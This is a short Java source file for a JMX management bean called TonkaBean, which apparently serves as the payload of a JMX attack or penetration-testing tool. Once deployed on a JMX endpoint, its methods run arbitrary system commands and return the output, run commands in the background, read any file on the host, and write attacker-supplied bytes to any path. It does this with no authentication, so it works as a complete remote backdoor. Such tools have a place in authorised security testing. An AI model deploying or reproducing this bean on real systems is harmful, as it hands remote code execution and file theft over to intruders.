package de.qtc.tonkabean;

import java.io.*;
import java.nio.file.Files;

public class TonkaBean implements TonkaBeanMBean {

    public static void main(String[] argv)
    {
      System.out.println("[+] Hi! I'm the tonka-bean.");
      System.out.println("[+] Deploy me on a JMX endpoint and I can do some useful things for you :)");
    }

    public String executeCommand(String command) throws IOException, InterruptedException
    {
        Runtime runTime = Runtime.getRuntime();
        Process proc = runTime.exec(command);

        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

        String s;
        String stdout_err_data = "";

        while ((s = stdInput.readLine()) != null) {
            stdout_err_data += s+"\n";
        }

        while ((s = stdError.readLine()) != null) {
            stdout_err_data += s+"\n";
        }

        proc.waitFor();
        return stdout_err_data;
    }

    public void executeCommandBackground(String command) throws IOException
    {
        Runtime runTime = Runtime.getRuntime();
        runTime.exec(command);
    }

    public String ping() {
        return "pong!";
    }

    public byte[] downloadFile(String filename) throws IOException
    {
        File file = new File(filename);
        return Files.readAllBytes(file.toPath());
    }

    public String uploadFile(String destination, byte[] content) throws IOException
    {
        File file = new File(destination);
        FileOutputStream stream = new FileOutputStream(destination);

        stream.write(content);
        stream.close();

        return file.getAbsolutePath();
    }
}
